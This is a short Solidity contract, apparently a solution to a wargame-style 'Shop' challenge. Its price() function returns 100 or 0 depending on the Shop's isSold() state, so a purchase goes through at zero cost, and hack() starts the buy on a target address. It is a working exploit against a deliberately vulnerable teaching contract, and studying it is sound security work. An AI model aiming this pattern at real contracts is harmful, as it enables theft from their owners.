// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';

contract ShopHack is Buyer {

    // this function will be called by Shop 
    function price() external view override returns(uint) {

        // this will return false, thr caller of this function is Shop
        bool isSold = Shop(msg.sender).isSold();

        // if else like to, change price, depending of the value of isSold
        assembly {
            let result
            switch isSold
            // if isSold = true, price is 0
            case 1 {
                result := 0
            }
            // if isSold = false, price is 100
            default {
                result := 100
            }
            // store and return the value of result
            mstore(0x0, result)
            return(0x0, 32)
        }
    }

    // hack starts here
    function hack(address _victim) external {
        Shop(_victim).buy();
    }

}